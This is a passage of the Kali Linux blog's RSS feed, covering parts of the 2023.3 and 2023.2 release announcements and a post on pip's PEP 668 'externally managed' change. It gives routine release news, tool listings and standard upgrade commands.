(Ansible)</li> </ul> <p>We also have some other goals, and replacing certain software with others (phase #2).</p> <p>At the same time, we have automated some actions such as:</p> <ul> <li>The cleaning up of suites (aka <a href="https://www.kali.org/docs/general-use/kali-branches/">branches</a> - kali-experimental and <a href="https://www.kali.org/docs/general-use/kali-bleeding-edge/">kali-bleeding-edge</a>)</li> </ul> <p>We are very much underway with these projects already (as bug bounty hunters may notice the changes)!</p> <h3 id="mirror-traces">Mirror Traces</h3> <p>We have a new sub-domain, <a href="https://mirror-traces.kali.org/">mirror-traces.kali.org</a>! This is to help mirror admins for our community mirrors. This now gives everyone using it more details and insight which is useful when troubleshooting and debugging issues.</p> <p>True to our word, we are doing more in the open, the git repository can be found here: <a href="https://gitlab.com/kalilinux/tools/mirror-status">gitlab.com/kalilinux/tools/mirror-status</a>.</p> <h3 id="packaging-tools">Packaging Tools</h3> <p>For a long time, we have shared our <a href="https://gitlab.com/kalilinux/tools/packaging">home-made scripts</a> publicly, which is our helping aid to manage all our packages in Kali. Recently we have expanded on them by giving the existing files a refresh by adding additional features and various quality-of-life improvements, as well as including new ones.</p> <p>As a recap, if you want to have a peek at some back-end development:</p> <ul> <li><a href="https://autopkgtest.kali.org/">AutoPkgTest</a> - Using <code>debci</code> in a CI fashion, we can test packages being built. <ul> <li>This integrates into Britney.</li> </ul> </li> <li><a href="http://repo.kali.org/britney">Britney2</a> (<a href="https://gitlab.com/kalilinux/tools/britney2">Git repo</a>) - Migrates packages between all of our suites (aka <a href="https://www.kali.org/docs/general-use/kali-branches/">branches</a>, such as &ldquo;debian-testing&rdquo;, &ldquo;kali-rolling&rdquo;, and &ldquo;kali-last-snapshot&rdquo; to name a few).</li> <li><a href="http://repo.kali.org/build-logs/">Build-Logs</a> - Output of <a href="https://gitlab.com/kalilinux/build-scripts/">our images/platform</a> as well as <a href="https://gitlab.com/kalilinux/packages">packages</a> being created on each supported architecture.</li> <li><a href="https://janitor.kali.org/">Janitor</a> - This is our automated packager as it will apply everything from minor formatting changes to preparing an package update. <ul> <li><em>The long term goal of this is to have it handle kali-bleeding-edge, linking into AutoPkgTest.</em></li> </ul> </li> <li><a href="https://pkg.kali.org/">Package Tracker</a> - Tracks each packages version&rsquo;s history.</li> <li><a href="https://kalilinux.gitlab.io/tools/packaging/">Packaging CI Overview</a> (<a href="https://gitlab.com/kalilinux/tools/packaging/-/blob/main/bin/gitlab-overview?ref_type=heads">Git repo</a>) - Quick (and dirty) overview of our package&rsquo;s CI status. </li> <li><a href="https://kalilinux.gitlab.io/tools/upstream-watch/">Upstream-Watch</a> (<a href="https://gitlab.com/kalilinux/tools/upstream-watch">Git repo</a>) - Monitors when there is an update upstream.</li> </ul> <h2 id="kali-autopilot">Kali Autopilot</h2> <p>With the release of <a href="https://gitlab.com/kalilinux/kali-purple/documentation/-/wikis/home">Kali Purple</a> in <a href="https://www.kali.org/blog/kali-linux-2023-1-release/">Kali 2023.1</a>, we also had the debut of <a href="https://gitlab.com/re4son/kali-autopilot/-/wikis/home">Kali Autopilot</a>. Since then, its been worked on and is unrecognizable with its redesigned GUI and multitudinous amount of features added.</p> <p><strong>What is Kali Autopilot? We are glad you asked!</strong> Kali Autopilot is an automated attack framework. It is a bit like an &ldquo;AutoPwner&rdquo;, which follows pre-defined &ldquo;attack scenarios&rdquo;. The motivation originally started its development for the defensive side of Kali.</p> <p>It is a lot easier to demonstrate Kali&rsquo;s offensive side, <em>especially when you start seeing the shells popping up</em>. But when it comes to the defensive side, how do you know if you have set things up? You start to ask questions:</p> <ul> <li>Are the Intrusion Detection System (IDS) and the Web Application Firewall (WAF) detecting malicious activities?</li> <li>Is the Security information and event management (SIEM) ingesting the right logs?</li> <li>Are the dashboards and alerts tuned to detect attacks?</li> <li>Are the analysts trained in finding the needle in the haystack?</li> <li>Has it been tested? <em>How can you test?</em></li> </ul> <p>Either you can wait for someone to try and break in, or you could do it yourself. This is where Kali Autopilot comes in.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-3-release/images/kali-autopilot.png'> <img src="https://www.kali.org/blog/kali-linux-2023-3-release/images/kali-autopilot.png" alt="Kali AutoPilot" /> </a> </p> </p> <p>Kali Autopilot consists of a GUI tool to design attacks and to generate attack scripts that perform those attack sequences, either manually or as a service, together with a web API interface for remote control. You can also download example attack scripts from the <a href="https://gitlab.com/kalilinux/kali-purple/purple-hub">Kali Purple Hub</a>. We currently have scripts for <a href="https://www.kali.org/tools/juice-shop/">juice-shop</a> and <a href="https://www.kali.org/tools/dvwa/">DWVA</a>. Just download the JSON from the hub and import it into Kali Autopilot.</p> <p>This tool has come along a lot in the last 6 months, and no plans on slowing down. As always, its shaped by the <a href="https://www.kali.org/community/">community</a>; ideas, features, and direction can be submitted and shaped by YOU. If you have developed attack scripts for vulnerable machines, we would love to include it on our <a href="https://gitlab.com/kalilinux/kali-purple/purple-hub">Kali Purple Hub</a>.</p> <h2 id="new-tools-in-kali">New Tools in Kali</h2> <p>We will kick it off with what&rsquo;s new <em>(to the network repositories)</em>:</p> <ul> <li><a href="https://www.kali.org/tools/calico/">Calico</a> - Cloud native networking and network security</li> <li><a href="https://www.kali.org/tools/cri-tools/">cri-tools</a> - CLI and validation tools for Kubelet Container Runtime Interface</li> <li><a href="https://www.kali.org/tools/hubble/">Hubble</a> - Network, Service &amp; Security Observability for Kubernetes using eBPF</li> <li><a href="https://www.kali.org/tools/imhex/">ImHex</a> - A Hex Editor for reverse engineers, programmers and people who value their retinas when working at 3 AM</li> <li><a href="https://www.kali.org/tools/kustomize/">kustomize</a> - Customization of kubernetes YAML configurations</li> <li><a href="https://www.kali.org/tools/rekono-kbx/">Rekono</a> - Automation platform that combines different hacking tools to complete pentesting processes</li> <li><a href="https://www.kali.org/tools/rz-ghidra/">rz-ghidra</a> - Deep ghidra decompiler and sleigh disassembler integration for rizin</li> <li><a href="https://www.kali.org/tools/unblob/">unblob</a> - Extract files from any kind of container formats</li> <li><a href="https://www.kali.org/tools/villain/">Villain</a> - C2 framework that can handle multiple reverse shells, enhance their functionality and share them among instances</li> </ul> <p><em>We also bumped the Kali kernel to 6.3.7.</em></p> <p>Along with new tools being added to Kali, there has been numerous packages and libraries updates, both major and minor version such as: <a href="https://www.kali.org/tools/gvm/">Greenbone</a>, <a href="https://www.kali.org/tools/humble/">Humble</a>, <a href="https://www.kali.org/tools/impacket/">Impacket</a>, <a href="https://www.kali.org/tools/jsql/">jSQL</a>, <a href="https://www.kali.org/tools/zaproxy/">OWASP ZAP</a>, <a href="https://www.kali.org/tools/rizin-cutter/">Rizin</a>, <a href="https://www.kali.org/tools/tetragon/">Tetragon</a>, <a href="https://www.kali.org/tools/theharvester/">theHarvester</a>, <a href="https://www.kali.org/tools/wireshark/">Wireshark</a> and <strong>many many more</strong>.</p> <p>Unfortunately <a href="https://www.kali.org/docs/tools/removed-tools/">we had to drop a few packages</a> from Kali:</p> <ul> <li><a href="https://www.kali.org/tools/king-phisher/">king-phisher</a> - The tool is no longer maintained by the original author <ul> <li>As an alternative, check <a href="https://www.kali.org/tools/gophish/">GoPhish</a> as a replacement</li> </ul> </li> <li><a href="https://www.kali.org/tools/king-phisher/">plecost</a> - Tool does not work with Python 3.11, and no response from original author <ul> <li>For an replacement, try <a href="https://www.kali.org/tools/wpscan/">WPScan</a></li> </ul> </li> </ul> <h3 id="rekono---community-package-submission">Rekono - Community Package Submission</h3> <p>We get a large amount of requests to add tools into Kali. We do have a <a href="https://www.kali.org/docs/policy/penetration-testing-tools-policy/">policy of what tools are added to Kali</a> and a process of how tools are packaged up and added (from network repositories to the default installed toolset). The draw back is that we do not have enough human power to be able to process them all. Our solution to this has been to help tool authors and/or anyone from the <a href="https://www.kali.org/community/">Kali community</a> create packages by writing a series of detailed, step-by-step guides covering the complete process and workflow of how we built those packages:</p> <ul> <li><a href="https://www.kali.org/docs/development/setting-up-packaging-system/">Setting up a system for packaging</a></li> <li><a href="https://www.kali.org/docs/development/intro-to-packaging-example/">Introduction to packaging step-by-step example</a> - <a href="https://www.kali.org/tools/instaloader/">Instaloader</a></li> <li><a href="https://www.kali.org/docs/development/intermediate-packaging-example/">Intermediate packaging step-by-step example</a> - <a href="https://www.kali.org/tools/photon/">Photon</a></li> <li><a href="https://www.kali.org/docs/development/advanced-packaging-example/">Advanced Packaging Step-By-Step Example</a> - <a href="https://www.kali.org/tools/finalrecon/">FinalRecon</a> &amp; <a href="https://pkg.kali.org/pkg/python-icmplib">Python-icmplib</a></li> <li><a href="https://www.kali.org/docs/development/packaging-apps-with-kaboxer/">Packaging Applications with Kaboxer</a> - &ldquo;Hello World&rdquo; with a Docker container</li> </ul> <p>When the tool was originally submitted by the tool author, we reviewed it, liked it, and agreed it should be in Kali. We did not have the cycles to process it ourselves quick enough, but the tool author did. They step up, and then re-submitted it again with them packaging up their tool. This saved us a lot of leg work, so reviewing the package became a breeze, and shortly after was added into Kali.</p> <p>If you are wanting a tool added into Kali - and you would like for it to happen sooner than we can do, have a go at trying to package yourself! There are other sources of doing &ldquo;Debian packaging&rdquo; out there, as well as our linked guides above. There is a initial learning curve, but its not as complex as you may think (especially if you are comfortable using Linux).</p> <p>Please note, we compile packages from <a href="https://www.kali.org/docs/policy/kali-linux-open-source-policy/">source</a>. <strong>Submitting a binary <code>*.deb</code> file will not be accepted</strong>.</p> <h2 id="miscellaneous">Miscellaneous</h2> <p>Below are a few other things which have been updated in Kali, which we are calling out which do not have as much detail:</p> <ul> <li>Added Pipewire support when using Hyper-V in enhanced session mode</li> <li>Added <code>kali-hidpi-mode</code> to support Kali-Purple</li> <li>Improved installation of Kali-Purple by removing the need to run any commands after installing <code>kali-themes-purple</code> </li> <li>Kali-Purple has a purple menu icon! </li> <li>The final reminder about <a href="https://www.kali.org/blog/python-externally-managed/">the breaking change with Python 3.12 &amp; PIP</a> </li> </ul> <h2 id="kali-nethunter-updates">Kali NetHunter Updates</h2> <p>We are proud to introduce a redesigned Kali NetHunter app and a completely new NetHunter Terminal, thanks to the amazing work of our very own <a href="https://twitter.com/martindatoss">@martin</a> and <a href="https://twitter.com/yesimxev">@yesimxev</a>. </p> <p>On the <a href="https://stats.nethunter.com/kernels.html">Kali NetHunter kernel</a> side, there are numerous updates:</p> <ul> <li>LG V20 for Lineage 19.1</li> <li>Nexus 6P for Android 8.0 (Oreo)</li> <li>Nothing Phone (1) for Android 12 (Snow cone) and 13 (Tiramisu) <em>(new)</em></li> <li>Pixel 3/XL for Android 13 (Tiramisu)</li> <li>Samsung Galaxy A7 for LineageOS 18.1 <em>(new)</em></li> <li>Xiaomi Mi A3 for Lineage 20</li> <li>Xiaomi Redmi 4/4X for VoltageOS 2.5</li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-3-release/images/NetHunter-Nothing.png'> <img src="https://www.kali.org/blog/kali-linux-2023-3-release/images/NetHunter-Nothing.png" alt="Nothing Phone (1)" /> </a> </p> </p> <p>Also worth mentioning:</p> <ul> <li>By popular demand we have added a SELinux disabler.</li> <li>Please note until we are able to replace Mana Toolkit, we have had to temporary downgrade iptables.</li> </ul> <h2 id="kali-arm-updates">Kali ARM Updates</h2> <p>The <a href="https://www.kali.org/docs/arm/raspberry-pi-zero-w/">Raspberry Pi Zero W</a> image now boots to CLI and not <a href="https://www.kali.org/docs/general-use/switching-desktop-environments/">GUI</a>. This change is in line with what we did with the <a href="https://www.kali.org/docs/arm/raspberry-pi/">Raspberry Pi 1</a> image a few releases ago. If you do not create a <code>wpa_supplicant.conf</code> to use, the easiest way to connect to a Wi-Fi network on the command line is to use the <code>nmtui</code> command. Alternatively, you can use <code>sudo nmcli --ask dev wifi connect network-ssid</code> to have it ask you for the password on the command line, without it showing up in your history.</p> <p><a href="https://www.kali.org/docs/arm/usb-armory-mki/">USBArmory MKI</a> and <a href="https://www.kali.org/docs/arm/usb-armory-mkii/">MKII</a> have had their bootloaders updated to 2023.07.</p> <p>The <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm/">ARM build scripts</a> have had some minor tweaks to deal with <a href="https://pkg.kali.org/pkg/policykit-1">policykit</a> updates to make sure the <code>pkla</code> files are properly created. </p> <h2 id="kali-website-updates">Kali Website Updates</h2> <p>Our <a href="https://www.kali.org/docs/">Kali documentation</a> has had various updates to existing pages as well as new pages:</p> <ul> <li><a href="https://www.kali.org/docs/community/contribute/">Contribute to Kali</a> <em>(updated)</em></li> <li><a href="https://www.kali.org/docs/installation/network-pxe/">Deploying Kali over Network PXE Install</a> <em>(updated)</em></li> <li><a href="https://www.kali.org/docs/general-use/wayland/">Wayland</a> <em>(new)</em></li> </ul> <p>A website is never complete, and our homepage is no exception. Recently we have been making some improvements:</p> <ul> <li><a href="https://www.kali.org/get-kali/">Get Kali</a> - Should be a little easier to scroll and move about the page now, switching between platforms</li> <li><a href="https://www.kali.org/partnerships/">Partnerships</a> - Updated to say a thank you to the new partnerships!</li> </ul> <p>Since our last release, we also did the following <a href="https://www.kali.org/blog/">blog posts</a>:</p> <ul> <li><a href="https://www.kali.org/blog/python-externally-managed/">Pip install and Python&rsquo;s externally managed</a></li> </ul> <h2 id="community-shout-outs">Community Shout-Outs</h2> <p>These are <strong>people from the public who have helped Kali</strong> and the team for the last release. And we want to praise them for their work <em>(we like to give credit where due!)</em>:</p> <ul> <li><a href="https://gitlab.com/Anutrix">Anutrix</a> - who helped with <a href="https://www.kali.org/docs/">kali.org/docs/</a></li> <li><a href="https://gitlab.com/Arszilla">Arszilla</a> - who helped with <a href="https://www.kali.org/tools/kali-meta/">i3</a></li> <li><a href="https://gitlab.com/Croluy">Croluy</a> - who helped with <a href="https://www.kali.org/docs/">kali.org/docs/</a></li> <li><a href="https://github.com/pablosnt">Pablo Santiago López</a> - who helped with <a href="https://www.kali.org/tools/rekono-kbx/">rekono-kbx</a></li> <li><a href="https://gitlab.com/ron190">ron190</a> - who helped with <a href="https://www.kali.org/tools/">kali.org/tools/</a></li> <li>Salty (from the <a href="https://discord.kali.org/">Kali Discord</a>) - helping with the Raspberry Pi release testing.</li> </ul> <p>Anyone can help out, anyone can get <a href="https://www.kali.org/docs/community/contribute/">involved</a>!</p> <h3 id="new-kali-mirrors">New Kali Mirrors</h3> <p>We have another community mirror:</p> <ul> <li>Armenia: <a href="http://kali.mirror1.gnc.am/">kali.mirror1.gnc.am</a> and <a href="http://kali.mirror2.gnc.am/">kali.mirror2.gnc.am</a>, sponsored by <a href="http://www.gnc.am/">GNC-ALFA CJSC</a>, thanks to Vahe Avagyan.</li> </ul> <p>If you have the disk space and bandwidth, <a href="https://www.kali.org/docs/community/setting-up-a-kali-linux-mirror/">we always welcome new mirrors</a>.</p> <hr> <h2 id="kali-team-discord-chat">Kali Team Discord Chat</h2> <p>Since the launch of <a href="https://discord.kali.org">our Discord server</a> with <a href="https://www.kali.org/blog/kali-linux-2022-3-release/">Kali 2022.3</a>, we have been doing an hour long voice chat with a number of Kali team members. This is when anyone can ask questions (hopefully relating to Kali or the information security industry) to us.</p> <p>The next session will happen a week after the release, <strong>Wednesday, 30th August 2023 16:00 -&gt; 17:00 <a href="https://time.is/UTC">UTC/+0 GMT</a></strong>.</p> <p><em>Please note we will not be recording this session. This is a live event only.</em></p> <hr> <h2 id="get-kali-linux-20233">Get Kali Linux 2023.3</h2> <p><strong>Fresh Images</strong>: Simple, <a href="https://www.kali.org/get-kali/">Get Kali</a>!</p> <p>Did you know, we do also produce <strong><a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly builds</a></strong> that you can use as well. These are for people who cannot wait for our next release and you want the latest packages <em>(or bug fixes)</em>. This way you will have fewer updates to do. <em>Just know that these are automated builds that we do not QA like we do our standard <a href="https://www.kali.org/releases/">release images</a></em>. But we gladly take <a href="https://bugs.kali.org/">bug reports</a> about those images because we want any issues to be fixed before our next release!</p> <p><strong>Existing Installs</strong>: If you already have an existing Kali Linux installation, remember you can always do a quick <a href="https://www.kali.org/docs/general-use/updating-kali/">update</a>:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware&quot; | sudo tee /etc/apt/sources.list [...] +--(kali?kali)-[~] +-$ sudo apt update &amp;&amp; sudo apt -y full-upgrade [...] +--(kali?kali)-[~] +-$ cp -vrbi /etc/skel/. ~/ [...] +--(kali?kali)-[~] +-$ [ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f </code></pre> <p>You should now be on Kali Linux 2023.3 We can do a quick check by doing:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ grep VERSION /etc/os-release VERSION=&quot;2023.3&quot; VERSION_ID=&quot;2023.3&quot; VERSION_CODENAME=&quot;kali-rolling&quot; +--(kali?kali)-[~] +-$ uname -v #1 SMP PREEMPT_DYNAMIC Debian 6.3.7-1kali1 (2023-06-29) +--(kali?kali)-[~] +-$ uname -r 6.3.0-kali1-amd64 </code></pre> <p><em>NOTE: The output of <code>uname -r</code> may be different depending on the system <a href="https://pkg.kali.org/pkg/linux">architecture</a>.</em></p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/">bug tracker</a>. <em>We will never be able to fix what we do not know is broken!</em> <strong>And Social networks are not bug trackers!</strong></p> <p>Want to keep in up-to-date easier? Automate it! We have a <a href="https://www.kali.org/rss.xml">RSS feeds</a> and <a href="https://www.kali.org/newsletter/">newsletter</a> of our <a href="https://www.kali.org/blog/">blog</a> to help you.</p></description>
</item>
<item>
<title>Pip install and Python's externally managed</title>
<link>https://www.kali.org/blog/python-externally-managed/</link>
<guid isPermaLink="true">https://www.kali.org/blog/python-externally-managed/</guid>
<pubDate>Thu, 06 Jul 2023 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/python-externally-managed/images/banner-python-externally-managed.jpg" type="image/jpg"/>
<description><p>TL;DR: <code>pip install</code> is on the way out. Installing Python packages must be done via APT, aka. Kali Linux&rsquo;s package manager. Python packages coming from other sources should be installed in virtual environments.</p> <p>Long story below.</p> <h2 id="some-background">Some background</h2> <p>Back in February this year, for a few days, some of you might have tried (and failed) to install Python packages with <a href="https://pip.pypa.io/en/stable/">Pip</a>, aka. Python&rsquo;s package manager. Suddenly it didn&rsquo;t work anymore, and it gave this error message instead:</p> <pre><code class="language-console">+--(root?kali)-[~] +-$ pip install xyz error: externally-managed-environment ? This environment is externally managed ?-&gt; To install Python packages system-wide, try apt install python3-xyz, where xyz is the package you are trying to install. If you wish to install a non-Debian-packaged Python package, create a virtual environment using python3 -m venv path/to/venv. Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make sure you have python3-full installed. If you wish to install a non-Debian packaged Python application, it may be easiest to use pipx install xyz, which will manage a virtual environment for you. Make sure you have pipx installed. See /usr/share/doc/python3.11/README.venv for more information. note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages. hint: See PEP 668 for the detailed specification. </code></pre> <p>This change came about without a notice, and judging by the early reports that we received, it was clear that it would impact many users. So we reverted it, and therefore <code>pip install</code> <a href="https://www.kali.org/blog/kali-linux-2023-1-release/#python-updates--changes">still works in Kali Linux these days</a>. But not for long: when Python 3.12 hits Kali (around end of 2023 or beginning of 2024), it will stop working, this time for good. There&rsquo;s not much we can do about it, it&rsquo;s an upstream change, we have to go with the flow.</p> <p>So why this change? Running <code>pip install</code> as root, in order to install Python packages system-wide, has never been a great idea. In a Linux distribution such as Kali, Python packages are already installed and managed via <em>APT</em>. If you bring in another package manager (<em>pip</em> in this case), it is likely to break packages and programs that were installed by APT, sooner or later. Then APT might break again what was installed by pip. Both package managers will endlessly step on each other&rsquo;s toes.</p> <p>One could also run <code>pip install --user</code> to install packages in the user&rsquo;s home directory, but the problem is the same. Those packages will be picked up by Python applications as they run, and might not be compatible with other packages installed by <em>APT</em>, causing programs to misbehave or break.</p> <p>The issue is not new, but it doesn&rsquo;t impact all users equally. Seasoned users of Linux distributions already know what to do, and NOT to do, and they can fix their system when it breaks. However, unexperienced users don&rsquo;t know, so they are likely to shoot themselves in the foot. And nobody can blame them, there are so many web pages out there recommending to run <code>sudo pip install</code> without providing enough context.</p> <p>We (Kali developers, and more generally distro developers), are well aware of the issue: bug reports for Python applications that don&rsquo;t work are a common occurence, and we often can&rsquo;t reproduce the issue, and we often find out that it doesn&rsquo;t work because some packages or applications were installed with <em>pip</em>, and interfere with other packages installed with <em>APT</em>. These recurring bug reports are not actionable, there&rsquo;s nothing we can fix on our side. Users get burnt and they learn from it, but it&rsquo;s no fun.</p> <h2 id="whats-changing">What&rsquo;s changing</h2> <p>Now, back to the upcoming change: <strong>in Kali Linux, starting with Python 3.12, pip will refuse to perform system-wide installs (<code>sudo pip install</code>) as well as user home directory installs (<code>pip install --user</code>)</strong>. This is good news, because it will make it harder for unexperienced users to break their system. This is a welcome change, and we are thankful to those who drove this change and made it happen. Long-term, it will be less pain for everyone. But short-term, some users won&rsquo;t like it, of course, we know.</p> <p>So if you&rsquo;re one of those who run <code>sudo pip install</code>, who have it hardwired in your fingers&hellip; well, you&rsquo;ll have to adjust. You might want to have a look at <a href="https://pypa.github.io/pipx/">pipx</a>, get more familiar with Python&rsquo;s virtual environments, and spend some time reading <a href="https://peps.python.org/pep-0668/">PEP 668: Marking Python environments as externally managed</a> to better understand the issue at hand.</p> <p>To finish, and to give a bit of a broader context: the PEP 668 proposal came about as a coordinated effort from various software distributions to fix this long-standing issue of <em>pip</em> breaking other package managers too easily. The change is already effective in other Linux distros (like the latest release of Debian). In Kali Linux, we just delayed it a bit, so that we can warn you in advance, so that you can adjust your workflow and scripts. But the change is coming with Python 3.12, there&rsquo;s no point delaying it further.</p> <p>Thanks for reading!</p></description>
</item>
<item>
<title>Kali Linux 2023.2 Release (Hyper-V & PipeWire)</title>
<link>https://www.kali.org/blog/kali-linux-2023-2-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2023-2-release/</guid>
<pubDate>Tue, 30 May 2023 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/kali-linux-2023-2-release/images/banner-2023.2-release.jpg" type="image/jpg"/>
<description><p>Quick off the mark from previous <a href="https://www.kali.org/blog/10-years/">10 year anniversary</a>, <strong>Kali Linux 2023.2</strong> is now here. It is ready for immediate <a href="https://www.kali.org/get-kali/">download</a> or <a href="https://www.kali.org/docs/general-use/updating-kali/">upgrading</a> <em>if you have an existing Kali Linux installation</em>.</p> <p>The <a href="https://bugs.kali.org/changelog_page.php">changelog</a> highlights over the last few weeks since March&rsquo;s <a href="https://www.kali.org/releases/">release</a> of <a href="https://www.kali.org/blog/kali-linux-2023-1-release/">2023.1</a> is:</p> <ul> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-2-release/#new-hyper-v-vm-image">New VM image for Hyper-V</a></strong> - With &ldquo;Enhanced Session Mode&rdquo; out of the box</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-2-release/#xfce--pipewire">Xfce audio stack update: enters PipeWire</a></strong> - Better audio for Kali&rsquo;s default desktop</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-2-release/#i3-desktop-overhaul">i3 desktop overhaul</a></strong> - i3-gaps merged with i3</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-2-release/#xfce">Desktop updates</a></strong> - Easy hashing in Xfce</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-2-release/#gnome-44">GNOME 44</a></strong> - Gnome Shell version bump</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-2-release/#gnome-44">Icons &amp; menus updates</a></strong> - New apps and icons in menu</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-2-release/#new-tools-in-kali">New tools</a></strong> - As always, various new packages added</li> </ul> <hr> <h2 id="new-hyper-v-vm-image">New Hyper-V VM Image</h2> <p>With this release, we welcome a new member in the family of pre-built VM images! We now provide an <a href="https://www.kali.org/get-kali/#kali-virtual-machines">image for Microsoft Hyper-V</a>.</p> <p>For those familiar with the matter, let&rsquo;s jump straight into the details. This is a GEN2 image for Hyper-V, pre-configured for <em>Enhanced Session Mode</em>. All you need to do is to download the image, unpack it, then run the script <code>install-vm.bat</code>. Afterwards open the Hyper-V Manager and start the VM. Hyper-V should automatically propose to connect via Enhanced Session Mode (aka. xRDP over HvSocket), thereby greatly improving the user experience.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-2-release/images/kali-hyperv-connect.png'> <img src="https://www.kali.org/blog/kali-linux-2023-2-release/images/kali-hyperv-connect.png" alt="" /> </a> </p> </p> <p>Before that, enabling Enhanced Session Mode required some manual steps, both on Windows and in the Kali VM, and it was not super easy. We hope that this new images provides a better out-of-the box experience for Hyper-V users. In fact, there should now be zero configuration required.</p> <p>More details about this new image can be found in our documentation, on the page <a href="https://www.kali.org/docs/virtualization/import-premade-hyperv/">Import Pre-Made Kali Hyper-V VM</a>.</p> <h2 id="xfce--pipewire">Xfce &amp; PipeWire</h2> <p>With this release, we changed the audio stack for Kali&rsquo;s default desktop: <a href="https://pipewire.org/">PipeWire</a> now replaces PulseAudio.</p> <p>Some background information: PipeWire is a &ldquo;server for handling audio, video streams, and hardware on Linux&rdquo;. It was initially released in 2017, is actively developed, and is poised to become the de-facto sound server in pretty much every Linux distribution out there, therefore replacing PulseAudio. The GNOME desktop already uses PipeWire by default in most Linux distributions, including Kali Linux since version <a href="https://www.kali.org/blog/kali-linux-2022-4-release/">2022.4</a> . Most users never noticed the change.</p> <p>But let&rsquo;s get back to Kali&rsquo;s default desktop environment: Xfce. Xfce does not really &ldquo;support&rdquo; PipeWire per se, but it does not need to. PipeWire provides a compatibility layer, under the form of the <code>pipewire-pulse</code> daemon. And that&rsquo;s what make the magic happens: applications that were meant to work with PulseAudio keep working as if nothing happened, blissfully unaware of the change.</p> <p>We do not expect any issue with this transition, actually we expect the opposite, some well-known issues should be fixed, sound should work better overall.</p> <p>What should you do about it? Nothing special. For users who upgrade their Kali installation though, a reminder: the right command to upgrade your system is <code>sudo apt update &amp;&amp; sudo apt full-upgrade</code>. Let us put the emphasis on <code>full-upgrade</code>, rather than <code>upgrade</code>: <a href="https://www.kali.org/docs/troubleshooting/handling-common-apt-errors/">it matters</a>.</p> <p>Should this change cause any problem with your setup, head to the page <a href="https://www.kali.org/docs/troubleshooting/no-sound/">No sound on Kali 2023.2</a> for tentative solutions.</p> <h2 id="i3-desktop-overhaul">i3 Desktop Overhaul</h2> <p>The Kali i3 desktop was completely redone!</p> <p>For context: <a href="https://i3wm.org/">i3</a> is a tiling window manager. You might not have heard of it, it&rsquo;s not available from the Kali&rsquo;s installer, and it can be said to be a desktop for advanced users. Nevertheless, Kali used to propose a i3 desktop (provided by the metapackage <code>kali-desktop-i3</code>) and also a i3-gaps desktop (metapackage <code>kali-desktop-i3-gaps</code>), which was a sort of alternative version of i3.</p> <p>The upstream projects <a href="https://github.com/Airblader/i3">i3-gaps and i3 merged recently</a>, so it was awkward for Kali to have two separate metapackages. Therefore those two packages were merged, and only <code>kali-desktop-i3</code> remains. This metapackage now provides a complete desktop environment (rather than a bare minimum, as it used to).</p> <p>All of that work was done by long-time i3 user and Kali contributor, <a href="https://arszilla.com/">Arszilla</a>, and we&rsquo;re really thankful for that. He shared some screenshots of his setup, so that he can give you an idea of what a i3 desktop can look like:</p> <p><strong>Lock Screen</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-2-release/images/i3-locked-screen.png'> <img src="https://www.kali.org/blog/kali-linux-2023-2-release/images/i3-locked-screen.png" alt="Kali 2023.2 i3 lock screen" /> </a> </p> </p> <p><strong>On/Off Menu</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-2-release/images/i3-power-menu.png'> <img src="https://www.kali.org/blog/kali-linux-2023-2-release/images/i3-power-menu.png" alt="Kali 2023.2 i3 on/off menu" /> </a> </p> </p> <p><strong>Desktop with tiled windows</strong> (note how inactive windows become transparent):</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-2-release/images/i3-tiled-windows.png'> <img src="https://www.kali.org/blog/kali-linux-2023-2-release/images/i3-tiled-windows.png" alt="Kali 2023.2 i3 desktop with tiled windows" /> </a> </p> </p> <p><strong>Desktop with floating windows</strong></p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-2-release/images/i3-floating-windows.png'> <img src="https://www.kali.org/blog/kali-linux-2023-2-release/images/i3-floating-windows.png" alt="Kali 2023.2 i3 desktop with floating windows" /> </a> </p> </p> <p>How can you try it out? Maybe the cleanest way is to <a href="https://www.kali.org/docs/development/live-build-a-custom-kali-iso/#configuring-the-kali-iso-build-optional">build yourself a custom installer iso</a> that includes the i3 desktop, and then install it on your machine of choice. After booting it up, refer to the <a href="https://gitlab.com/Arszilla/i3-dotfiles#installation">installation guide</a>, there are a few manual steps to run if you want to configure your i3 desktop to something similar to the screenshots above.</p> <h2 id="desktop-updates">Desktop Updates</h2> <h3 id="xfce">Xfce</h3> <p>In this release we pre-installed a nifty extension for the Xfce File Manager: <a href="https://gtkhash.org/">GtkHash</a>. This extension provides the option to quickly compute checksums, simply by doing a right-click on a file and then opening the <em>Checksums</em> tab. No need to open a terminal and type the command manually! Screenshot below:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-2-release/images/gtkhash.png'> <img src="https://www.kali.org/blog/kali-linux-2023-2-release/images/gtkhash.png" alt="GtkKash" /> </a> </p> </p> <h3 id="gnome-44">GNOME 44</h3> <p>Like for (almost) every half-year, there is a new version bump for the GNOME desktop environment. Kali 2023.2 brings the new version, <a href="https://release.gnome.org/44/">GNOME 44</a>, which is a more polished experienced following the work previously introduced in previous version.</p> <p>Here are some of the new features for this update:</p> <ul> <li>Enhanced Shell Quick Settings 